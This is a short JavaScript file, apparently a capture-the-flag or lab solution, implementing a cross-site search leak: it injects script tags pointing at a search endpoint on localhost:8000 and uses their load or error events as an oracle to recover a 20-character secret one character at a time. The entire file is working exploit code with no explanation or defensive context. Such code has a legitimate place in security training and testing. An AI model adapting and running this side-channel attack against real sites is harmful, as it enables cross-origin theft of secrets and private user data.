async function req(url) {
    return await new Promise((resolve, reject) => {
        const script = document.createElement("script");
        script.src = url;
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}
async function search(query) {
    try {
        await req(
          `http://localhost:8000/search?query=${query}`
        );
        return true;
    } catch (e) {
        return false;
    }
}
async function exploit() {
    let chars = "_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    let secret_length = 20;
    let secret = "";
    for (let i = 0; i < secret_length; i++) {
        for (let c of chars) {
            if (await search(secret + c)) {
                secret += c;
                console.log(`found: ${secret}`);
                break;
            }
        }
    }
}
exploit()